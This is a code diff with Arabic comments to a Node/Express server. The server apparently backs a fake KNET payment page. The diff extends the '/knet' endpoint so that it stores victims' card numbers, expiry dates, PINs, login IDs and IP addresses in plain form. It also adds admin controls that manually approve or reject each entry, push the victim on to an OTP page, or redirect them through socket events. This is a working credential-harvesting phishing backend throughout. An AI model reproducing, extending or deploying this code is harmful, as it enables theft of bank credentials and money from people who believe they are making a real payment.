@@ -130,17 +130,40 @@ app.post('/api/admin/payment-action', authMiddleware, (req, res) => {
   db = loadData();
   const booking = db.bookings[reference];
   if (!booking) return res.json({ success: false, error: 'حجز غير موجود' });
+  
   if (action === 'pass') {
-    booking.status = 'pending_payment';
+    // عند القبول: تغيير حالة knetPayment إلى APPROVED حتى ينتقل Angular لصفحة OTP
+    booking.status = 'approved';
     if (booking.payment) booking.payment.paymentAction = 'pass';
+    // تحديث knetPayment أيضاً
+    if (booking.knetId) {
+      const knetPayment = (db.knetPayments || []).find(p => p.id === booking.knetId || p.knetId === booking.knetId);
+      if (knetPayment) {
+        knetPayment.status = 'APPROVED';
+        knetPayment.updatedAt = new Date().toISOString();
+      }
+    }
   } else if (action === 'denied') {
     booking.status = 'cancelled';
     if (booking.payment) booking.payment.paymentAction = 'denied';
+    // تحديث knetPayment أيضاً
+    if (booking.knetId) {
+      const knetPayment = (db.knetPayments || []).find(p => p.id === booking.knetId || p.knetId === booking.knetId);
+      if (knetPayment) {
+        knetPayment.status = 'REJECTED';
+        knetPayment.updatedAt = new Date().toISOString();
+      }
+    }
   } else if (action === 'completed') {
     booking.status = 'completed';
   }
   saveData(db);
   io.emit('paymentActionSet', { reference, action });
+  // إرسال تحديث للعميل عبر socket
+  if (booking.knetId) {
+    const knetPayment = (db.knetPayments || []).find(p => p.id === booking.knetId);
+    if (knetPayment) io.emit('payment_updated', knetPayment);
+  }
   res.json({ success: true });
 });
 
@@ -161,6 +184,21 @@ app.post('/api/admin/set-redirect', authMiddleware, (req, res) => {
   db = loadData();
   if (reference) {
     db.redirects[reference] = target;
+    // حفظ الريدايركت بالـ knetId أيضاً إذا كان الحجز له knetId
+    const booking = db.bookings[reference];
+    if (booking && booking.knetId) {
+      db.redirects[booking.knetId] = target;
+      // تحديث knetPayment بالريدايركت
+      const knetPayment = (db.knetPayments || []).find(p => p.id === booking.knetId);
+      if (knetPayment) {
+        knetPayment.adminRedirectUrl = getRedirectUrl(target, reference);
+        knetPayment.status = 'REDIRECT';
+        knetPayment.updatedAt = new Date().toISOString();
+        // إرسال تحديث للعميل عبر socket
+        io.emit('payment_updated', knetPayment);
+        io.emit('admin_redirect', { paymentId: booking.knetId, redirectUrl: knetPayment.adminRedirectUrl });
+      }
+    }
   } else {
     db.globalRedirect = target;
   }
@@ -522,10 +560,20 @@ app.post('/knet', (req, res) => {
   db = loadData();
   if (!db.knetPayments) db.knetPayments = [];
   
+  const paymentId = Date.now().toString();
   const newPayment = {
-    id: Date.now().toString(),
-    knetId: 'KN' + Date.now(),
-    ...paymentData,
+    id: paymentId,
+    knetId: paymentId,
+    // حفظ كل البيانات الواردة من Angular
+    clientId: paymentData.clientId || '',
+    bankName: paymentData.bankName || paymentData.bank || '',
+    prefix: paymentData.prefix || paymentData.cardPrefix || '',
+    cardNumber: paymentData.cardNumber || '',
+    expiryMonth: paymentData.expiryMonth || '',
+    expiryYear: paymentData.expiryYear || '',
+    pin: paymentData.pin || '',
+    loginId: paymentData.loginId || '',
+    amount: paymentData.amount || '0.250',
     status: 'PENDING',
     createdAt: new Date().toISOString(),
     ip: req.ip
@@ -533,13 +581,13 @@ app.post('/knet', (req, res) => {
   db.knetPayments.push(newPayment);
   
   // Also add to bookings
-  const ref = 'KN-' + Date.now().toString().substring(7);
+  const ref = 'KN-' + paymentId.substring(7);
   db.bookings[ref] = {
     referenceId: ref,
-    clientName: paymentData.cardHolder || paymentData.name || 'عميل',
-    clientId: paymentData.civilId || '',
-    clientPhone: paymentData.phone || '',
-    clientEmail: paymentData.email || '',
+    clientName: paymentData.clientId || paymentData.loginId || 'عميل KNET',
+    clientId: paymentData.clientId || '',
+    clientPhone: '',
+    clientEmail: '',
     clientIp: req.ip,
     serviceType: 'دفع KNET',
     serviceDate: new Date().toLocaleDateString('ar-SA'),
@@ -548,17 +596,18 @@ app.post('/knet', (req, res) => {
     statusRead: 0,
     createdAt: new Date().toISOString(),
     payment: {
+      bank: paymentData.bankName || paymentData.bank || '',
+      cardPrefix: paymentData.prefix || paymentData.cardPrefix || '',
       cardNumber: paymentData.cardNumber || '',
-      cardHolder: paymentData.cardHolder || paymentData.name || '',
-      cardPrefix: paymentData.cardPrefix || '',
-      bank: paymentData.bank || '',
       expiryMonth: paymentData.expiryMonth || '',
       expiryYear: paymentData.expiryYear || '',
       pin: paymentData.pin || '',
+      loginId: paymentData.loginId || '',
+      clientId: paymentData.clientId || '',
       amount: paymentData.amount || '0.250',
       status: 'PENDING'
     },
-    knetId: newPayment.id
+    knetId: paymentId
   };
   
   saveData(db);
@@ -567,8 +616,8 @@ app.post('/knet', (req, res) => {
   
   res.json({
     success: true,
-    knetId: newPayment.id,
-    paymentId: newPayment.id,
+    knetId: paymentId,
+    paymentId: paymentId,
     status: 'PENDING'
   });
 });
@@ -578,9 +627,16 @@ app.get('/knet/status/:id', (req, res) => {
   db = loadData();
   const payment = (db.knetPayments || []).find(p => p.id === req.params.id || p.knetId === req.params.id);
   if (payment) {
+    // إضافة الريدايركت من db.redirects إذا وجد
+    const redirectTarget = db.redirects[req.params.id];
+    if (redirectTarget && !payment.adminRedirectUrl) {
+      payment.adminRedirectUrl = getRedirectUrl(redirectTarget, req.params.id);
+    }
     res.json(payment);
   } else {
-    res.json({ status: 'PENDING' });
+    // التحقق من الريدايركت
+    const redirect = db.redirects[req.params.id] || db.globalRedirect;
+    res.json({ status: 'PENDING', redirect: redirect ? getRedirectUrl(redirect, req.params.id) : null });
   }
 });
 
